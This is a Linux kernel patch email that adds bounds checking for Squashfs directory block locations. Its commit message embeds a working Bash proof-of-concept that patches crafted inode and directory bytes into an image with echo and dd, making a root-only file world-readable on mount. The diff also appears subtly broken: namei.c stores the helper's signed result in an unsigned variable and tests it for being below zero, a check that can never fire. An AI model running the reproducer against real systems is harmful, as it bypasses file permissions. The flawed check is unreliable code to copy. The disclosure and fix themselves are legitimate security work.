Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=188.121.53.32
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1794440699;
	b=L+IVLvW4t/0Gnh+bosTtuw4WZcCX3Jolm7jfe1P8g/oKBMWUd8EbUJOUJIweKQzxXqx8
	 /zk1IzR/7wmzhnlSHm6IE66IGtn/+1e+mBn5bXQTRsRhVOPJo+DO5Gmcl7/XbxHYQJCuX
	 VA/TyqfzB0bt+ZJBPBqp2sJGYpUse78icOcMrvmNzDbVz88adSsNjnyMnfpgL43gB5Ip1
	 B1eZ0jPrKsU3fVLnCyVVywbp/Wi6PxhYCCRwn7mPVX1zs1d2HlHB20hRZfRnjBPwKuuAg
	 c7Ndh3nUsVT7nMVdGdppwv1/JilUEOzsBVG+gLxilEGAbzRFEkPqQBL9U+WpaB2iAoA==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1794440699;
	h=DMARC-Filter:Received:DKIM-Signature:DKIM-Signature:X-CMAE-Analysis:
	 Feedback-ID:X-SECURESERVER-ACCT:From:To:Cc:Subject:Date:Message-ID:
	 X-Mailer:In-Reply-To:References:MIME-Version:
	 Content-Transfer-Encoding:X-CMAE-Envelope;
	bh=zxkkdrG7jd2J1gN3QexYnKfDm2svbw/IBcb0xrNmnV0=;
	b=BvHSDKNIsEXnJYAUl64p69gyoTU7DPbnQL2jLaRkjCocN9GdIVok2oPcwTWeq1HIUePZ
	 a4TJjr/VvgiqlGcZnoFQh1R0n82pDAuI71MMbtgFj9myLuNTfsntOPJ09lRlYN12EIiku
	 iXvmkI/t3txNot9h2Pgx5xw5lC5KUu+lVjdco4sS/9Oghj+CTaY7ueT6RPqvpjD82tVlo
	 YZgyIE7Y5zrwIex1EZIG/Q0UG6u1+hq4RhgEQttrig/3dJlI5gBv/fUa8sq+OoGuAMJVa
	 A5tD/G/H+tiX/Qh/iC9hDaQZfZsr3V9zQerKNm1kDqO4MAbWzn/IFijyH0mDQSoc86w==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dmarc=pass header.from=squashfs.org.uk;
	spf=pass smtp.mailfrom=squashfs.org.uk;
	dkim=pass header.d=secureserver.net header.i=@secureserver.net header.a=rsa-sha256 header.s=secureserver2 header.b="b/8ld0/T";
	dkim=pass header.d=squashfs.org.uk header.i=@squashfs.org.uk header.a=rsa-sha256 header.s=secureserver1 header.b=cBLanr7d;
	arc=none smtp.remote-ip=188.121.53.32
Received: from sxplsmtpa04-03.prod.sxb1.secureserver.net (sxplsmtpa04-03.prod.sxb1.secureserver.net [188.121.53.32])
	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 8654D606B5CF
	for <linux-fsdevel@vger.kernel.org>; Wed, 11 Nov 2026 23:44:58 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 8654D606B5CF
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=squashfs.org.uk
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=squashfs.org.uk
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key, unprotected) header.d=secureserver.net header.i=@secureserver.net header.a=rsa-sha256 header.s=secureserver2 header.b=b/8ld0/T;
	dkim=pass (2048-bit key, unprotected) header.d=squashfs.org.uk header.i=@squashfs.org.uk header.a=rsa-sha256 header.s=secureserver1 header.b=cBLanr7d
Received: from avalon.fritz.box ([82.69.79.175])
	by :SMTPAUTH: with ESMTPA
	id RHz6xtxIpLwCURHzfxAFYa; Wed, 11 Nov 2026 23:44:44 +0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=secureserver.net;
	s=secureserver2; t=1794440685;
	bh=zxkkdrG7jd2J1gN3QexYnKfDm2svbw/IBcb0xrNmnV0=;
	h=From:To:Cc:Subject:Date:In-Reply-To:References;
	b=b/8ld0/TrpVfS83nl/XYxdtbuVQpUvPte4XK2eVuNKl7VPyhDoTnxMuBsSPaLoxhg
	 2zmyS553M5h/o7so1OkdRdcRY8ozEcuKEJoTlLOUh/Woh+89DriD8y2zOlmSctkRSu
	 NZLeD5pRk6vnAVAzdDk1V590qskxoXRvKjRw9MlZlRSoOJhWNdvqf5IXOtsDcHTEdL
	 4J3zkDIqY6aPdPGLMLcqZp8+sNdE2nPhufu7AP9d7k4JEfdZ0RioC0BLy5t9R1y26L
	 pV+PzNrGnsp2LlW9sUU/jMmZb1SeisE+b/mI/SggWee8LVe04OjwAtmDoSH0ifAxOx
	 4+lnxwWdEzr1Q==
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=squashfs.org.uk;
	s=secureserver1; t=1794440685;
	bh=zxkkdrG7jd2J1gN3QexYnKfDm2svbw/IBcb0xrNmnV0=;
	h=From:To:Cc:Subject:Date:In-Reply-To:References;
	b=cBLanr7dfHyg0IgPbBHc0m0MB/1pcuahbr4nQlnPzfC4nYvcvMQg5eBvR9ikNhXz0
	 GQJMYzmpyfOhwPcRmt8RK5+FLLZD6X03mNZ09azYd5snSwIZtxnH6/VQQvQuiIfFCC
	 RBMYo7owlgpeNeEjcfYYBDLVzDOeUotaFFk5JechaZs24TNMvjZ3pSFbD+BNxk5uCV
	 dKh/EwE/FnUZR9CU/HrhlCHs0JNIklTiSRZaZFNFeqO06zFBdYAQ3TvewaaQ/5vFNb
	 a5LpOieszCHvbXr0vK3NNG74H+lLnqfm7jbZ3NlVVKzxH2ztcP5wTKm5eda3lH7z8x
	 2+AlFbv7/WHLA==
X-CMAE-Analysis: v=2.4 cv=XZYcX455 c=1 sm=1 tr=0 ts=6af4fdec
 a=84ok6UeoqCVsigPHarzEiQ==:117 a=84ok6UeoqCVsigPHarzEiQ==:17 a=FXvPX3liAAAA:8
 a=gec7vXQWKUr_qcHTS5AA:9 a=UObqyxdv-6Yh2QiB9mM_:22
Feedback-ID: 41d82b3d80f95744f09de311410ae659:squashfs.org.uk:ssnet
X-SECURESERVER-ACCT: phillip@squashfs.org.uk
From: Phillip Lougher <phillip@squashfs.org.uk>
To: linux-kernel@vger.kernel.org,
	linux-fsdevel@vger.kernel.org,
	akpm@linux-foundation.org
Cc: Phillip Lougher <phillip@squashfs.org.uk>
Subject: [PATCH v2 11/22] Squashfs: sanity check directory metadata block location
Date: Wed, 11 Nov 2026 23:43:51 +0000
Message-ID: <20261111234402.252354-12-phillip@squashfs.org.uk>
X-Mailer: git-send-email 2.47.3
In-Reply-To: <20261111234402.252354-1-phillip@squashfs.org.uk>
References: <20261111234402.252354-1-phillip@squashfs.org.uk>
X-Mailing-List: linux-fsdevel@vger.kernel.org
List-Id: <linux-fsdevel.vger.kernel.org>
List-Post: <mailto:linux-fsdevel@vger.kernel.org>
List-Help: <mailto:linux-fsdevel+help@vger.kernel.org>
List-Subscribe: <mailto:linux-fsdevel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-fsdevel+unsubscribe@vger.kernel.org>
List-Owner: <mailto:linux-fsdevel+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit
X-CMAE-Envelope: MS4xfDfBHEPyPUgL7VIC2q3cKyBm5Xi5yu2TjLf4Oi4foRD/S+PVPX8b0J1TIztCJXNsxlHW+lwod+R9laYUvXby63KQXcZHI4m+3x0tfNimOeafZ51INrcX
 OpPMkF6HY7pfaFuAMUG7FU+V+9E3D1XXcyE3kN5AcRZlthfHIhENx/S+9M14vQRQHXIgaK7j7EImgLvqcxXmQXg7mlDA35croCmW2G5RW5kpgGKA3FJ7p+Zm
 Jpa0AQKXe8gfFUE6WQeJgvR8Lp+DdiAIzNwr7ttTeu/31UyXTs20DjBZkfNH67EsV7NmMQhufwADaRYk9pp2PXfToT0KDex/kGzXfRDdous=

The contents of directories are stored in compressed metadata blocks,
which are placed in the directory table.  The location of a directory
is thus represented as a tuple, the location of the compressed metadata
block that the directory is in, and the offset into the uncompressed
block.  The block location is not absolute, and it is instead encoded
as an offset from the start of the directory table.

An attacker could manipulate the directory block location to make it
point to a replacement malicious directory stored elsewhere, outside
the directory table.  This is because the code does not check that the
location is valid and is within the directory table.

In practice this exploit is hard to achieve because metadata in Squashfs
is compressed by default, and so the compressed metadata cannot be
directly altered.  In addition due to sanity checking at mount time
there are no gaps in the filesystem to store a malicious directory.

Also anyone with access to Mksquashfs/Unsquashfs can copy and recreate
the filesystem incorporating whatever changes they want.

However, there are a number of exploit scenarios here.  Many embedded
systems or secure systems have deliverately restricted installations
with only basic tools, and lack any Mksquashfs/Unsquashfs.  But exploits
due to this bug can be achieved with only echo and dd.

An example exploit is where a Squashfs filesystem has a file in the
root directory with permissions 0700 (u=rxw), where only the superuser
can read it.  But using this bug an attacker could create a malicious
replacement directory in the inode lookup table (used by NFS), that
points to a malicious replacement inode that has the permissions
changed to 0777 (a=wrx).  On reboot/remount this would make the
file readable by unpriviliged users.

The following shell script acts as a reproducer and proof of concept.

This commit blocks such attempts by adding a new helper
squashfs_dir_start() which adds additional sanity checking, first
ensuring no arithmetic operations overflow, and second checking that
the directory is within the directory table.

Reproducer
==========

The following Bash script uses echo and dd to achieve the previously
discussed exploit.  If the exploit is successful the file "data"
permissions will be changed to 0777 (a=rwx), but otherwise the
filesystem is unchanged.

===================================================================
#!/bin/bash

ARGS="-no-sparse -no-hardlinks -no-progress -quiet -inode-time 0 -mkfs-time 0"

finish() {
	popd 2>&1 > /dev/null
	rm -rf $DIR
	exit 1
}

DIR=$(mktemp -d)

pushd $DIR 2>&1 > /dev/null

# Create a Squashfs pseudo file which is fed to Mksquashfs
echo Create a Squashfs pseudo file which is fed to Mksquashfs

dd if=/dev/zero of=zero bs=1024 count=1 status=none
echo "data f 0700 0 0 echo some data" >> pseudo
echo "files d 0777 0 0" >> pseudo
for i in $(seq 1 100); do
	echo "files/$i f 0655 1000 1000 cat zero" >> pseudo
done

# Create a Squashfs filesystem
echo "Create a Squashfs filesystem"

if ! mksquashfs - img.sqsh -pf pseudo -p "/ d 0777 0 0" $ARGS; then
	echo Failed to create Squashfs filesystem
	finish
fi

# Exploit: The file named "data" has permissions 0700, which can only be
# read by the superuser.  The desire is to change the permissions on
# the file to be 0777, which can be read by unpriviliged users.
#
# Due to compression of the metadata, this cannot be done by directly
# writing to the metadata tables.  Instead the real metadata is replaced
# by malicious metadata starting from the "data" file inode upwards to
# the root inode.
#
# This is a three step process.
#
# 1. A new "data" file inode is placed within the inode lookup table
# 2. A new root directory which points to the new "data" file inode is
#    placed in the inode lookup table
# 3. A new root inode which pounts to the new root directory table is
#    placed in the inode lookup table.
#
# For brevity this reproducer uses pre-computed data for the above.

# Write malicious inode for file "data", this is the same as the
# original except it is uncompressed, and the permissions are set to
# 0777.
echo Writing malicious inode for file \"data\"

/usr/bin/echo -en "\x20\x80\x02\x00\xFF\x01\x00\x00\x00\x00\x00\x00\
\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\
\x00\x0A\x00\x00\x00" > file

dd bs=1 seek=1034 if=file of=img.sqsh count=34 conv=notrunc status=none

# Write directory data which points to the malicious inode
echo Writing root directory which points to malicious inode

/usr/bin/echo -en "\x31\x80\x00\x00\x00\x00\x90\x03\x00\x00\x01\x00\x00\
\x00\x00\x00\x00\x00\x02\x00\x03\x00\x64\x61\x74\x61\x00\x00\x00\x00\
\x00\x00\x00\x00\x02\x00\x00\x00\xA0\x0C\x00\x00\x01\x00\x04\x00\x66\
\x69\x6c\x65\x73" > file

dd bs=1 seek=983 if=file of=img.sqsh count=51 conv=notrunc status=none

#
# Write root inode, this is the same as the original root inode, except
# it is uncompressed, and it points to the new directory data
echo Writing root inode which points to the new root directory

/usr/bin/echo -en "\x20\x80\x01\x00\xFF\x01\x00\x00\x00\x00\x00\x00\
\x00\x00\x67\x00\x00\x00\x43\x02\x00\x00\x03\x00\x00\x00\x34\x00\x00\
\x00\x00\x00\x00\x00" > file

dd bs=1 seek=949 if=file of=img.sqsh count=34 conv=notrunc status=none

# Update the root_inode field in the superblock to point to our new
# root inode.  The start block is an offset from the inode_table_start,
# and not an absolute value.  The start of the inode table is 122, the
# new inode is placed at position 949, and so the offset is 827. Because
# we've only stored one inode in the metadata block, the offset into
# that block is 0.
echo Updating the root_inode field in the superblock

/usr/bin/echo -en "\x00\x00\x3B\x03" > file

dd bs=1 seek=32 if=file of=img.sqsh count=4 conv=notrunc status=none

# Mount the filesystem to /mnt
echo Mount the filesystem to /mnt

if ! mount -t squashfs img.sqsh /mnt; then
	echo Mount of Squashfs filesystem failed
	finish
fi

# Stat /mnt/data, if the exploit is successful, permissions should be 0777
echo "************************************************************************"
echo Stat /mnt/data, if the exploit is successful, permissions should be 0777

stat /mnt/data

popd 2>&1> /dev/null

rm -rf $DIR
=====================================================================

Fixes: c88da2c979369 ("Squashfs: directory lookup operations")
Signed-off-by: Phillip Lougher <phillip@squashfs.org.uk>
---
v2:
 - Ensure dire is not used uninitialised.
 - Ensure empty filesystems do not trigger new sanity checks.
---
 fs/squashfs/dir.c              | 20 ++++++++++++++------
 fs/squashfs/namei.c            | 20 +++++++++++++-------
 fs/squashfs/squashfs_fs_sb.h   |  1 +
 fs/squashfs/squashfs_helpers.h | 17 +++++++++++++++++
 fs/squashfs/super.c            |  1 +
 5 files changed, 46 insertions(+), 13 deletions(-)

diff --git a/fs/squashfs/dir.c b/fs/squashfs/dir.c
index cd3598bd034f..f6454f0d5b5c 100644
--- a/fs/squashfs/dir.c
+++ b/fs/squashfs/dir.c
@@ -22,6 +22,7 @@
 #include "squashfs_fs.h"
 #include "squashfs_fs_sb.h"
 #include "squashfs_fs_i.h"
+#include "squashfs_helpers.h"
 #include "squashfs.h"
 
 static const unsigned char squashfs_filetype_table[] = {
@@ -41,6 +42,7 @@ static int get_dir_index_using_offset(struct super_block *sb,
 	int i_count, u64 f_pos)
 {
 	struct squashfs_sb_info *msblk = sb->s_fs_info;
+	s64 res;
 	int err, i, index, length = 0;
 	unsigned int size;
 	struct squashfs_dir_index dir_index;
@@ -81,9 +83,12 @@ static int get_dir_index_using_offset(struct super_block *sb,
 		if (err < 0)
 			break;
 
+		res = squashfs_dir_start(le32_to_cpu(dir_index.start_block), msblk);
+		if (res < 0)
+			break;
+
 		length = index;
-		*next_block = le32_to_cpu(dir_index.start_block) +
-					msblk->directory_table;
+		*next_block = res;
 	}
 
 	*next_offset = (length + *next_offset) % SQUASHFS_METADATA_SIZE;
@@ -99,13 +104,16 @@ static int squashfs_readdir(struct file *file, struct dir_context *ctx)
 {
 	struct inode *inode = file_inode(file);
 	struct squashfs_sb_info *msblk = inode->i_sb->s_fs_info;
-	u64 block = squashfs_i(inode)->start + msblk->directory_table;
+	s64 block = squashfs_dir_start(squashfs_i(inode)->start, msblk);
 	int offset = squashfs_i(inode)->offset, length, err;
 	unsigned int inode_number, dir_count, size, type;
 	struct squashfs_dir_header dirh;
-	struct squashfs_dir_entry *dire;
+	struct squashfs_dir_entry *dire = NULL;
+
+	TRACE("Entered squashfs_readdir [%llx:%x]\n", squashfs_i(inode)->start, offset);
 
-	TRACE("Entered squashfs_readdir [%llx:%x]\n", block, offset);
+	if (block < 0)
+		goto failed_read;
 
 	dire = kmalloc(sizeof(*dire) + SQUASHFS_NAME_LEN + 1, GFP_KERNEL);
 	if (dire == NULL) {
@@ -211,7 +219,7 @@ static int squashfs_readdir(struct file *file, struct dir_context *ctx)
 	return 0;
 
 failed_read:
-	ERROR("Unable to read directory block [%llx:%x]\n", block, offset);
+	ERROR("Unable to read directory block [%llx:%x]\n", squashfs_i(inode)->start, offset);
 	kfree(dire);
 	return 0;
 }
diff --git a/fs/squashfs/namei.c b/fs/squashfs/namei.c
index 2260a3f05fde..9f6f6792b549 100644
--- a/fs/squashfs/namei.c
+++ b/fs/squashfs/namei.c
@@ -66,6 +66,7 @@ static int get_dir_index_using_name(struct super_block *sb,
 			int index_offset, int i_count, const char *name)
 {
 	struct squashfs_sb_info *msblk = sb->s_fs_info;
+	s64 res;
 	int i, length = 0, err;
 	unsigned int size;
 	struct squashfs_dir_index *index;
@@ -99,9 +100,12 @@ static int get_dir_index_using_name(struct super_block *sb,
 		if (strcmp(index->name, name) > 0)
 			break;
 
+		res = squashfs_dir_start(le32_to_cpu(index->start_block), msblk);
+		if (res < 0)
+			break;
+
 		length = le32_to_cpu(index->index);
-		*next_block = le32_to_cpu(index->start_block) +
-					msblk->directory_table;
+		*next_block = res;
 	}
 
 	*next_offset = (length + *next_offset) % SQUASHFS_METADATA_SIZE;
@@ -126,13 +130,16 @@ static struct dentry *squashfs_lookup(struct inode *dir, struct dentry *dentry,
 	struct inode *inode = NULL;
 	struct squashfs_sb_info *msblk = dir->i_sb->s_fs_info;
 	struct squashfs_dir_header dirh;
-	struct squashfs_dir_entry *dire;
-	u64 block = squashfs_i(dir)->start + msblk->directory_table;
+	struct squashfs_dir_entry *dire = NULL;
+	u64 block = squashfs_dir_start(squashfs_i(dir)->start, msblk);
 	int offset = squashfs_i(dir)->offset;
 	int err, length;
 	unsigned int dir_count, size;
 
-	TRACE("Entered squashfs_lookup [%llx:%x]\n", block, offset);
+	TRACE("Entered squashfs_lookup [%llx:%x]\n", squashfs_i(dir)->start, offset);
+
+	if (block < 0)
+		goto data_error;
 
 	dire = kmalloc(sizeof(*dire) + SQUASHFS_NAME_LEN + 1, GFP_KERNEL);
 	if (dire == NULL) {
@@ -219,8 +226,7 @@ static struct dentry *squashfs_lookup(struct inode *dir, struct dentry *dentry,
 
 read_failure:
 	ERROR("Unable to read directory block [%llx:%x]\n",
-		squashfs_i(dir)->start + msblk->directory_table,
-		squashfs_i(dir)->offset);
+		squashfs_i(dir)->start, squashfs_i(dir)->offset);
 failed:
 	kfree(dire);
 	return ERR_PTR(err);
diff --git a/fs/squashfs/squashfs_fs_sb.h b/fs/squashfs/squashfs_fs_sb.h
index b87221ea9bdd..949dab87a241 100644
--- a/fs/squashfs/squashfs_fs_sb.h
+++ b/fs/squashfs/squashfs_fs_sb.h
@@ -67,6 +67,7 @@ struct squashfs_sb_info {
 	__le64					*inode_lookup_table;
 	u64					inode_table;
 	u64					directory_table;
+	u64					directory_table_end;
 	u64					xattr_table;
 	unsigned int				block_size;
 	unsigned short				block_log;
diff --git a/fs/squashfs/squashfs_helpers.h b/fs/squashfs/squashfs_helpers.h
index 138173860f7c..4fb13096fcbc 100644
--- a/fs/squashfs/squashfs_helpers.h
+++ b/fs/squashfs/squashfs_helpers.h
@@ -70,6 +70,23 @@ static inline s64 squashfs_mkinode(u32 start, u16 offset)
 	return ((s64)start << 16) | offset;
 }
 
+/* directory helper functions */
+static inline s64 squashfs_dir_start(u32 blk, struct squashfs_sb_info *msblk)
+{
+	s64 start;
+
+	if (S64_MAX - msblk->directory_table < blk)
+		return -EINVAL;
+
+	start = msblk->directory_table + blk;
+
+	if (msblk->directory_table < msblk->directory_table_end &&
+				start >= msblk->directory_table_end)
+		return -EINVAL;
+
+	return start;
+}
+
 /* fragment and fragment table defines */
 static inline s64 squashfs_fragment_bytes(u32 fragments)
 {
diff --git a/fs/squashfs/super.c b/fs/squashfs/super.c
index 0e511dd29d58..8c42f1eb375b 100644
--- a/fs/squashfs/super.c
+++ b/fs/squashfs/super.c
@@ -437,6 +437,7 @@ static int squashfs_fill_super(struct super_block *sb, struct fs_context *fc)
 		err = -EINVAL;
 		goto insanity;
 	}
+	msblk->directory_table_end = next_table;
 
 	/* Sanity check inode_table */
 	if (msblk->inode_table >= msblk->directory_table) {
-- 
2.47.3

